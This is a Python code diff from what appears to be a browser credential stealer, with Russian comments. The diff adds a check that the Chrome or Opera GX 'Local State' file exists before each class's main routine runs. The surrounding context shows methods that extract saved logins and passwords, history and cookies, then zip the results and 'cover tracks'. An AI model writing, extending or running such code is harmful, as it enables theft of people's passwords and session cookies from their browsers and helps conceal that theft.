@@ -223,6 +223,10 @@ class Telegram:
 class Chrome:
 	""" Данные Chrome"""
 	path = r'\AppData\Local\Google\Chrome\User Data\Local State'  # путь до файла с зашифрованным мастер паролем
+	def check_browzer():
+		if not os.path.exists(Chrome.path):
+			raise Exception
+
 	# ----------------------------------------------- Логины и Пароли начало скрипта
 	@staticmethod
 	def get_login_and_password():
@@ -299,6 +303,7 @@ class Chrome:
 	@staticmethod
 	def main():
 		try:
+			Chrome.check_browzer()
 			Chrome.get_login_and_password()
 			Chrome.main_history_cookies()
 			Chrome.create_zip_cover_tracks()
@@ -314,6 +319,9 @@ class Chrome:
 class OperaGX:
 	""" Данные OperaGX GX"""
 	path = r'\AppData\Roaming\Opera Software\Opera GX Stable\Local State'
+	def check_browzer():
+		if not os.path.exists(OperaGX.path):
+			raise Exception
 	# ----------------------------------------------- Логины и Пароли начало скрипта
 	@staticmethod
 	def get_login_and_password():
@@ -390,6 +398,7 @@ class OperaGX:
 	@staticmethod
 	def main():
 		try:
+			OperaGX.check_browzer()
 			OperaGX.get_login_and_password()
 			OperaGX.main_history_cookies()
 			OperaGX.create_zip_cover_tracks()
